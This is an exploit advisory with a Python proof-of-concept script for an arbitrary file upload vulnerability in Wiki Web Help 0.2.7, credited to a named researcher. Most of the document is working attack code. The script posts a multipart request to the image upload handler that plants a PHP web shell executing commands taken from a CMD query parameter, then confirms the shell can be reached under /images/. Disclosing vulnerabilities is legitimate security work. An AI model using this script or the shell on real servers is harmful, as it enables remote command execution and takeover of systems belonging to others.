# ------------------------------------------------------------------------
# Software................Wiki Web Help 0.2.7
# Vulnerability...........Arbitrary Upload
# Download................http://sourceforge.net/projects/wwh/
# Release Date............7/1/2010
# Tested On...............Windows Vista + XAMPP
# ------------------------------------------------------------------------
# Author..................John Leitch
# Site....................http://cross-site-scripting.blogspot.com/
# Email...................john.leitch5@gmail.com
# ------------------------------------------------------------------------
# 
# --Description--
# 
# An arbitrary upload vulnerability in Wiki Web Help 0.2.7 can be 
# exploited to upload a PHP shell.
# 
# 
# --PoC--

import sys, socket
host = 'localhost'
path = '/wwh'
port = 80

def upload_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.settimeout(8)    

    s.send('POST ' + path + '/handlers/uploadimage.php HTTP/1.1\r\n'
           'Host: ' + host + '\r\n'
           'Proxy-Connection: keep-alive\r\n'
           'Content-Length: 194\r\n'
           'Cache-Control: max-age=0\r\n'           
           'Content-Type: multipart/form-data; boundary=----x\r\n'
           'Accept: text/html\r\n'
           'Accept-Encoding: gzip,deflate,sdch\r\n'
           'Accept-Language: en-US,en;q=0.8\r\n'
           'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n\r\n'
           '------x\r\n'
           'Content-Disposition: form-data; name="imagefile"; filename="shell.php"\r\n'
           'Content-Type: application/octet-stream\r\n\r\n'
           '<?php echo \'<pre>\' + system($_GET[\'CMD\']) + \'</pre>\'; ?>\r\n'
           '------x--\r\n\r\n')

    resp = s.recv(8192)

    http_ok = 'HTTP/1.1 200 OK'
    
    if http_ok not in resp:
        print 'error uploading shell'
        return
    else: print 'shell uploaded'

    s.send('GET ' + path + '/images/shell.php HTTP/1.1\r\n'\
           'Host: ' + host + '\r\n\r\n')

    if http_ok not in s.recv(8192): print 'shell not found'        
    else: print 'shell located at ' + path + '/images/shell.php'

upload_shell()
